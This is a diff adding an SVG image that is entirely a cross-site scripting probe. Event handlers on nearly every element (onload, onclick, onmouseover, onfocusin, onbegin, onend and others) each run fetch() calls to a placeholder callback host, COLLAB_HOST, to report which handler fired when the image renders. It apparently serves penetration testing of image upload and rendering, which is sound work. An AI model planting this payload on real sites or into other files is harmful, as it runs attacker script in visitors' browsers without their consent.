@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="320" height="140"
+     onload="fetch('https://COLLAB_HOST/xss-sweep-svg-onload',{mode:'no-cors'})">
+  <rect width="320" height="70" fill="#eee"
+        onclick="fetch('https://COLLAB_HOST/xss-sweep-rect-onclick',{mode:'no-cors'})"
+        onmouseover="fetch('https://COLLAB_HOST/xss-sweep-rect-onmouseover',{mode:'no-cors'})"
+        onmousemove="fetch('https://COLLAB_HOST/xss-sweep-rect-onmousemove',{mode:'no-cors'})"
+        onactivate="fetch('https://COLLAB_HOST/xss-sweep-rect-onactivate',{mode:'no-cors'})"
+        onfocusin="fetch('https://COLLAB_HOST/xss-sweep-rect-onfocusin',{mode:'no-cors'})"/>
+  <rect y="80" width="10" height="10">
+    <animate attributeName="x" from="0" to="1" dur="1s" repeatCount="2"
+             onbegin="fetch('https://COLLAB_HOST/xss-sweep-animate-onbegin',{mode:'no-cors'})"
+             onrepeat="fetch('https://COLLAB_HOST/xss-sweep-animate-onrepeat',{mode:'no-cors'})"
+             onend="fetch('https://COLLAB_HOST/xss-sweep-animate-onend',{mode:'no-cors'})"/>
+    <set attributeName="y" to="81" begin="0s"
+         onbegin="fetch('https://COLLAB_HOST/xss-sweep-set-onbegin',{mode:'no-cors'})"/>
+  </rect>
+  <a xlink:href="#" onfocusin="fetch('https://COLLAB_HOST/xss-sweep-a-onfocusin',{mode:'no-cors'})"
+     onclick="fetch('https://COLLAB_HOST/xss-sweep-a-onclick',{mode:'no-cors'})">
+    <text x="20" y="125" font-size="14">tab or click here</text>
+  </a>
+</svg>
